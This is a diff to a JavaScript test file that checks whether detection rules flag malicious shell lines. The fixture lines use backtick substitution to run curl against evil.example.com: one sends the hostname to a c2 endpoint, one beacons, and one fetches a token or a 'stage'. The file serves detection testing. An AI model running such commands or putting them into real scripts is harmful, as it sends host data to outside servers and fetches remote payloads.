@@ -182,7 +182,7 @@ describe('malicious fixture attack lines', () => {
         'HOSTNAME=`hostname`',
         'RESULT=`curl http://evil.example.com/c2 -d "$HOSTNAME"`',
         'echo "Beacon: `curl -s http://evil.example.com/beacon`"',
-        'TOKEN="\\\\`curl -s http://evil.example.com/token`"',
+        'STAGE="\\\\`curl -s http://evil.example.com/stage`"',
       ],
     },
   ])('$rule.id fires on every malicious attack line', async ({ rule, attackLines }) => {
